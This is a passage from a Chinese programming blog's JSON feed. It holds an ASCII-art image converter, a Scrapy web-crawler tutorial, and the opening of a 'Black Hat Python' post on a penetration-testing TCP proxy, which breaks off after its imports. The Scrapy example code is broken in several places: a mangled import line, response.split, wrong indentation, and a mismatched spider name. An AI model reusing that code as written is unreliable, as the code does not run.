data-num=\"11\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--width'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">140</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出字符画宽</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--height'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">90</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出字符画高</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 获取参数</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>IMG <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span><span class=\"token builtin\">file</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>WIDTH <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>width</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>HEIGHT <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>height</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># OUTPUT = args.output # 输出到文件</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ascii_char <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;>i!lI;:,\\\"^`'. \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># 将 256 灰度映射到 70 个字符上</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_char</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> alpha<span class=\"token operator\">=</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> alpha <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">' '</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ascii_char<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    gray <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.2126</span> <span class=\"token operator\">*</span> r <span class=\"token operator\">+</span> <span class=\"token number\">0.7152</span> <span class=\"token operator\">*</span> g <span class=\"token operator\">+</span> <span class=\"token number\">0.0722</span> <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">256.0</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> length</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">return</span> ascii_char<span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gray <span class=\"token operator\">/</span> unit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    im <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>IMG<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    im <span class=\"token operator\">=</span> im<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>WIDTH<span class=\"token punctuation\">,</span> HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> Image<span class=\"token punctuation\">.</span>NEAREST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    txt <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>HEIGHT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>WIDTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            txt <span class=\"token operator\">+=</span> get_char<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>im<span class=\"token punctuation\">.</span>getpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        txt <span class=\"token operator\">+=</span> <span class=\"token string\">'\\n'</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>txt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token comment\"># # 字符画输出到文件</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token comment\"># if OUTPUT:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">#     with open(OUTPUT, 'w') as f:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">#         f.write(txt)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token comment\"># else:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token comment\">#     with open(\"output.txt\", 'w') as f:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token comment\">#         f.write(txt)</span></pre></td></tr></table></figure><h2 id=\"结果展示\"><a class=\"anchor\" href=\"#结果展示\">#</a> 结果展示</h2>\n<p>非常可爱的一只小熊猫。我在画图工具里，把字符保存为了图片。</p>\n<p><img data-src=\"100.png\" alt=\"\" /></p>\n<p><img data-src=\"200.png\" alt=\"\" /></p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/scrapy%E6%A1%86%E6%9E%B6/",
            "url": "https://or0kit.github.io/Programming/Python/scrapy%E6%A1%86%E6%9E%B6/",
            "title": "scrapy框架",
            "date_published": "2020-12-28T09:47:19.000Z",
            "content_html": "<h1 id=\"什么是scrapy\"><a class=\"anchor\" href=\"#什么是scrapy\">#</a> 什么是 scrapy</h1>\n<font color=\"#00CED1\">\n<p>Scrapy 是一个为了爬取网站数据，提取结构性数据而编写的应用框架。可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。其最初是为了页面抓取 (更确切来说，网络抓取) 所设计的，也可以应用在获取 API 所返回的数据 (例如 Amazon Associates Web Services ) 或者通用的网络爬虫。Scrapy 其实是 Search+Python。Scrapy 使用 Twisted 这个异步网络库来处理网络通讯，架构清晰，并且包含了各种中间件接口，可以灵活的完成各种需求。</p>\n</font>\n<h1 id=\"scrapy架构\"><a class=\"anchor\" href=\"#scrapy架构\">#</a> scrapy 架构</h1>\n<h2 id=\"scrapy整体结构\"><a class=\"anchor\" href=\"#scrapy整体结构\">#</a> Scrapy 整体结构</h2>\n<font color=\"#00CED1\">\n<p><strong>1、引擎 (Scrapy Engine)</strong><br />\n 用来处理整个系统的数据流处理，触发事务。</p>\n<p><strong>2、调度器 (Scheduler)</strong><br />\n 用来接受引擎发过来的请求，压入队列中，并在引擎再次请求的时候返回。</p>\n<p><strong>3、下载器 (Downloader)</strong><br />\n 用于下载网页内容，并将网页内容返回给蜘蛛。</p>\n<p><strong>4、蜘蛛 (Spiders)</strong><br />\n 蜘蛛是主要干活的，用它来制订特定域名或网页的解析规则。编写用于分析 response 并提取 item (即获取到的 item) 或额外跟进的 URL 的类。<br />\n每个 spider 负责处理一个特定 (或一些) 网站。蜘蛛的整个抓取流程（周期）是这样的：</p>\n<ol>\n<li>首先获取第一个 URL 的初始请求，当请求返回后调取一个回调函数。第一个请求是通过调用 start_requests () 方法。该方法默认从 start_urls 中的 Url 中生成请求，并执行解析来调用回调函数。</li>\n<li>在回调函数中，你可以解析网页响应并返回项目对象和请求对象或两者的迭代。这些请求也将包含一个回调，然后被 Scrapy 下载，然后有指定的回调处理。</li>\n<li>在回调函数中，你解析网站的内容，同程使用的是 Xpath 选择器（但是你也可以使用 BeautifuSoup, lxml 或其他任何你喜欢的程序），并生成解析的数据项。</li>\n<li>最后，从蜘蛛返回的项目通常会进驻到项目管道。</li>\n</ol>\n<p><strong>5、项目管道 (Item Pipeline)</strong><br />\n 主要责任是负责处理有蜘蛛从网页中抽取的项目，他的主要任务是清晰、验证和存储数据。当页面被蜘蛛解析后，将被发送到项目管道，并经过几个特定的次序处理数据。每个项目管道的组件都是有一个简单的方法组成的 Python 类。他们获取了项目并执行他们的方法，同时他们还需要确定的是是否需要在项目管道中继续执行下一步或是直接丢弃掉不处理。<br />\n项目管道通常执行的过程有：</p>\n<ol>\n<li>清洗 HTML 数据</li>\n<li>验证解析到的数据（检查项目是否包含必要的字段）</li>\n<li>检查是否是重复数据（如果重复就删除）</li>\n<li>将解析到的数据存储到数据库中</li>\n</ol>\n<p><strong>6、下载器中间件 (Downloader Middlewares)</strong><br />\n 位于 Scrapy 引擎和下载器之间的钩子框架，主要是处理 Scrapy 引擎与下载器之间的请求及响应。它提供了一个自定义的代码的方式来拓展 Scrapy 的功能。下载中间器是一个处理请求和响应的钩子框架。他是轻量级的，对 Scrapy 尽享全局控制的底层的系统。</p>\n<p><strong>7、蜘蛛中间件 (Spider Middlewares)</strong><br />\n 介于 Scrapy 引擎和蜘蛛之间的钩子框架，主要工作是处理蜘蛛的响应输入和请求输出。它提供一个自定义代码的方式来拓展 Scrapy 的功能。蛛中间件是一个挂接到 Scrapy 的蜘蛛处理机制的框架，你可以插入自定义的代码来处理发送给蜘蛛的请求和返回蜘蛛获取的响应内容和项目。</p>\n<p><strong>8、调度中间件 (Scheduler Middlewares)</strong><br />\n 介于 Scrapy 引擎和调度之间的中间件，从 Scrapy 引擎发送到调度的请求和响应。他提供了一个自定义的代码来拓展 Scrapy 的功能。</p>\n<p><strong>数据处理流程</strong><br />\n<img data-src=\"image001.jpg\" alt=\"\" /></p>\n<p>如图所示，显示的是 Scrapy 爬虫执行流程，绿线是数据流向，首先从初始 URL 开始，Scheduler 会将其交给 Downloader 进行下载，下载之后会交给 Spider 进行分析，Spider 分析出来的结果有两种：一种是需要进一步抓取的链接，例如之前分析的 “下一页” 的链接，这些东西会被传回 Scheduler；另一种是需要保存的数据，它们则被送到 Item Pipeline 那里，那是对数据进行后期处理（详细分析、过滤、存储等）的地方。另外，在数据流动的通道里还可以安装各种中间件，进行必要的处理。</p>\n<p>Scrapy 中的数据流由执行引擎控制，其过程如下:</p>\n<ol>\n<li>引擎打开一个网站 (open a domain)，找到处理该网站的 Spider 并向该 spider 请求第一个要爬取的 URL (s)。</li>\n<li>引擎从 Spider 中获取到第一个要爬取的 URL 并在调度器 (Scheduler) 以 Request 调度。</li>\n<li>引擎向调度器请求下一个要爬取的 URL。</li>\n<li>调度器返回下一个要爬取的 URL 给引擎，引擎将 URL 通过下载中间件 (请求 (request) 方向) 转发给下载器 (Downloader)。</li>\n<li>一旦页面下载完毕，下载器生成一个该页面的 Response, 并将其通过下载中间件 (返回 (response) 方向) 发送给引擎。</li>\n<li>引擎从下载器中接收到 Response 并通过 Spider 中间件 (输入方向) 发送给 Spider 处理。</li>\n<li>Spider 处理 Response 并返回爬取到的 Item 及 (跟进的) 新的 Request 给引擎。</li>\n<li>引擎将 (Spider 返回的) 爬取到的 Item 给 Item Pipeline，将 (Spider 返回的) Request 给调度器。</li>\n<li>(从第二步) 重复直到调度器中没有更多地 request，引擎关闭该网站</li>\n</ol>\n</font>\n<h2 id=\"scrapy命令行工具\"><a class=\"anchor\" href=\"#scrapy命令行工具\">#</a> Scrapy 命令行工具</h2>\n<font color=\"green\">\n<p>Scrapy 是通过 scrapy 命令行工具进行控制的。这里我们称之为 “Scrapy tool” 以用来和子命令进行区分。对于子命令，我们称为 “command” 或者 “Scrapy commands”。Scrapy tool 针对不同的目的提供了多个命令，每个命令支持不同的参数和选项</p>\n</font>\n<h2 id=\"默认的scrapy-项目结构\"><a class=\"anchor\" href=\"#默认的scrapy-项目结构\">#</a> 默认的 Scrapy 项目结构</h2>\n<font color=\"DeepSkyBlue\">\n<p>在开始对命令行工具以及子命令的探索前，让我们首先了解一下 Scrapy 的项目的目录结构。虽然可以被修改，但所有的 Scrapy 项目默认有类似于下边的文件结构:</p>\n<pre><code>scrapy.cfg\n    myproject/\n        __init__.py\n        items.py\n        middlewares.py\n        pipelines.py\n        settings.py\n        spiders/\n            __init__.py\n            spider1.py\n            spider2.py\n            ...\n</code></pre>\n<ol>\n<li>scrapy.cfg<br />\n 存放的目录被认为是项目的根目录。该文件中包含 python 模块名的字段定义了项目的设置。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2l0ZW1zLnB5\">items.py</span><br />\n 该文件中包含了 scrapy 数据容器模型代码。<br />\nItem 对象是种简单的容器，保存了爬取到得数据。其提供了类似于词典 (dictionary-like) 的 API 以及用于声明可用字段的简单语法。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL21pZGRsZXdhcmVzLnB5\">middlewares.py</span><br />\n 该文件中包含下载器中间件和爬虫中间件模型代码。<br />\n下载器中间件是介于 Scrapy 的 request/response 处理的钩子框架。是用于全局修改 Scrapy request 和 response 的一个轻量、底层的系统。<br />\n爬虫中间件是介入到 Scrapy 的 spider 处理机制的钩子框架，您可以添加代码来处理发送给 Spiders 的 response 及 spider 产生的 item 和 request。。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BpcGVsaW5lcy5weQ==\">pipelines.py</span><br />\n 每个管道组件是实现了简单方法的 Python 类。<br />\n他们接收到 Item 并通过它执行一些行为，同时也决定此 Item 是否继续通过后续的管道组件，或是被丢弃而不再进行处理。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NldHRpbmdzLnB5\">settings.py</span><br />\nScrapy 设定 (settings) 提供了定制 Scrapy 组件的方法。<br />\n您可以控制包括核心 (core)，插件 (extension)，pipeline 及 spider 组件。</li>\n</ol>\n</font>\n<h1 id=\"编写第一个scrapy爬虫\"><a class=\"anchor\" href=\"#编写第一个scrapy爬虫\">#</a> 编写第一个 Scrapy 爬虫</h1>\n<font color=\"BlueViolet\">\n<p>任务:</p>\n<ol>\n<li>创建一个 Scrapy 项目</li>\n<li>定义提取的 Item</li>\n<li>编写爬取网站的 spider 并提取 Item</li>\n<li>编写 Item Pipeline 来存储提取到的 Item (即数据)</li>\n</ol>\n</font>\n<h2 id=\"创建项目\"><a class=\"anchor\" href=\"#创建项目\">#</a> 创建项目</h2>\n<font color=\"BlueViolet\">\n<p>在开始爬取之前，您必须创建一个新的 Scrapy 项目。<br />\n进入您打算存储代码的目录中，运行下列命令: <code>scrapy startproject tutorial</code> <br />\n 该命令将会创建包含下列内容的 tutorial 目录:</p>\n<pre><code>tutorial/\n    scrapy.cfg\n    tutorial/\n        __init__.py\n        items.py\n        pipelines.py\n        settings.py\n        spiders/\n            __init__.py\n            ...\n</code></pre>\n<p>这些文件分别是:</p>\n<ul>\n<li>scrapy.cfg: 项目的配置文件</li>\n<li>tutorial/: 该项目的 python 模块。之后您将在此加入代码。</li>\n<li>tutorial/items.py: 项目中的 item 文件。</li>\n<li>tutorial/pipelines.py: 项目中的 pipelines 文件。</li>\n<li>tutorial/settings.py: 项目的设置文件。</li>\n<li>tutorial/spiders/: 放置 spider 代码的目录</li>\n</ul>\n</font>\n<h2 id=\"定义item\"><a class=\"anchor\" href=\"#定义item\">#</a> 定义 Item</h2>\n<font color=\"BlueViolet\">\n<p>Item 是保存爬取到的数据的容器；其使用方法和 python 字典类似，并且提供了额外保护机制来避免拼写错误导致的未定义字段错误。<br />\n类似在 ORM 中做的一样，您可以通过创建一个 scrapy.Item 类，并且定义类型为 scrapy.Field 的类属性来定义一个 Item。(如果不了解 ORM, 不用担心，您会发现这个步骤非常简单)<br />\n 首先根据需要从 dmoz.org 获取到的数据对 item 进行建模。我们需要从 dmoz 中获取名字，url，以及网站的描述。对此，在 item 中定义相应的字段。编辑 tutorial 目录中的 items.py 文件。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>items<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> scrapyclass </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>DmozItem<span class=\"token punctuation\">(</span>scrapy<span class=\"token punctuation\">.</span>Item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    title<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    link<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    desc<span class=\"token operator\">=</span>scrapy<span class=\"token punctuation\">.</span>Field<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>代码一开始这看起来可能有点复杂，但是通过定义 item，您可以很方便的使用 Scrapy 的其他方法。而这些方法需要知道您的 item 的定义。</p>\n</font>\n<h2 id=\"spider爬虫\"><a class=\"anchor\" href=\"#spider爬虫\">#</a> Spider 爬虫</h2>\n<font color=\"BlueViolet\">\n<p>Spider 是用户编写用于从单个网站 (或者一些网站) 爬取数据的类。<br />\n其包含了一个用于下载的初始 URL，如何跟进网页中的链接以及如何分析页面中的内容，提取生成 item 的方法。</p>\n<p>为了创建一个 Spider，您必须继承 scrapy.Spider 类，且定义以下三个属性:</p>\n<ul>\n<li>name: 用于区别 Spider。该名字必须是唯一的，您不可以为不同的 Spider 设定相同的名字。</li>\n<li>start_urls: 包含了 Spider 在启动时进行爬取的 url 列表。因此，第一个被获取到的页面将是其中之一。后续的 URL 则从初始的 URL 获取到的数据中提取。</li>\n<li>parse () 是 spider 的一个方法。被调用时，每个初始 URL 完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。该方法负责解析返回的数据 (response data)，提取数据 (生成 item) 以及生成需要进一步处理的 URL 的 Request 对象。</li>\n</ul>\n<p>也可以使用命令行创建一个 Spider。比如要生成 Quotes 这个 Spider，可以执行如下命令：<br />\n <code>cd 项目目录</code> <br />\n <code>scrapy genspider quotes quotes.toscrape.com</code> <br />\n 语法格式<br />\n <code>scrapy genspider [options] &lt;name&gt; &lt;domain&gt;</code></p>\n<p>以下为我们的第一个 Spider 代码，保存在 tutorial/spiders 目录下的 dmoz_spider.py 文件中，如 Code 3-21 所示:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*-coding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> scrapyclass </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>DmozSpider<span class=\"token punctuation\">(</span>scrapy<span class=\"token punctuation\">.</span>Spider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    name <span class=\"token operator\">=</span> <span class=\"token string\">'dmoz'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    allowed_domains <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'dmoz.org'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    start_urls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'http://www.dmoz.org/Computers/Programming/Langurages/Python/Books'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">'http://www.dmoz.org/Computers/Programming/Langurages/Python/Resources'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    filename<span class=\"token operator\">=</span>response<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span></pre></td></tr></table></figure></font>\n<h2 id=\"爬虫爬取\"><a class=\"anchor\" href=\"#爬虫爬取\">#</a> 爬虫爬取</h2>\n<font color=\"BlueViolet\">\n<p>进入项目的根目录，执行下列命令启动 spider: <code>scrapy crawl homeweather</code></p>\n</font>\n<h2 id=\"紧急\"><a class=\"anchor\" href=\"#紧急\">#</a> 紧急</h2>\n<p>学校要提前放假，考试也提前了。。<br />\n抓紧时间备考了</p>\n<p>考试后再总结</p>\n",
            "tags": [
                "scrapy"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BA%8C-%E2%80%94%E2%80%94%E5%88%9B%E5%BB%BATCP%E4%BB%A3%E7%90%86/",
            "url": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BA%8C-%E2%80%94%E2%80%94%E5%88%9B%E5%BB%BATCP%E4%BB%A3%E7%90%86/",
            "title": "BHP第二章(二)——创建TCP代理",
            "date_published": "2020-12-25T01:12:58.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>总算有时间了，赶紧学一会。</p>\n<h1 id=\"为什么要创建一个tcp代理\"><a class=\"anchor\" href=\"#为什么要创建一个tcp代理\">#</a> 为什么要创建一个 TCP 代理</h1>\n<p>书中原话：</p>\n<blockquote>\n<p>有很多理由让你的工具箱里，保留一个 TCP 代理，<font color=\"green\">它不仅可以将流量从一个主机转发给另一个主机，而且可以评估基于网络的软件。在企业级环境下进行渗透测试时，你会经常遇到无法使用 Wireshark 的情况，无法在 windows 系统上加载驱动嗅探本地网络流量，分段的网络也阻止使用工具直接嗅探目标主机。我经常在实际案例中部署简单的 TCP 代理以了解未知的协议，修改发送到应用的数据包，或者为模糊测试创建一个测试环境。</font></p>\n</blockquote>\n<h1 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h1>\n<p>首先要搞清楚原理，网上搜索的时候看到了一篇介绍：《简单聊聊网络代理原理》<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NjI3MTkzMQ==\">https://zhuanlan.zhihu.com/p/56271931</span></p>\n<p>Python 实现 TCP 代理的原理</p>\n<ol>\n<li>【需要代理方】向代理服务器发出请求信息。</li>\n<li>【代理服务器】应答。</li>\n<li>【需要代理方】接到应答后发送向【代理服务器】发送【目的】ip 和端口。</li>\n<li>【代理服务器】与目的连接。</li>\n<li>【代理服务器】将【需要代理方】发出的信息传到【目的方】，将目的方发出的信息传到【需要代理方】。</li>\n<li>代理完成。</li>\n</ol>\n<p>画了个图：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"基于python3实现的tcp代理\"><a class=\"anchor\" href=\"#基于python3实现的tcp代理\">#</a> 基于 Python3 实现的 TCP 代理</h1>\n<blockquote>\n<p>书上是 2.x 版本的，想要改成 3.x 版本的。网上一搜，前辈们已经在几年前就替我们实现了。把代码改变了一下</p>\n</blockquote>\n<p><font color='red'>我已经把所有代码都写上了注释。</font></p>\n<p>解释一下【receive_first】参数：<br />\n这个参数如果是 True，程序会先接受远程目标主机发送的数据，因为有些服务进程可能会做这样的事情，例如 ftp 服务器一般会首先发送旗标。</p>\n<h1 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#说明：这里涉及到三方：本地主机、远程主机和服务器。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#该段代码是运行在 Linux 服务器上的，为本地主机提供代理以便与远程主机通信。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> logging</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> ctypes</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>logging<span class=\"token punctuation\">.</span>basicConfig<span class=\"token punctuation\">(</span>level<span class=\"token operator\">=</span>logging<span class=\"token punctuation\">.</span>DEBUG<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                    <span class=\"token comment\"># 格式化输出</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                    <span class=\"token builtin\">format</span><span class=\"token operator\">=</span><span class=\"token string\">'%(asctime)s - %(levelname)s : %(message)s'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token comment\"># 日志信息输出到文件中</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token comment\">#filename=\"./TCP_proxy.log\", filemode=\"a\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td 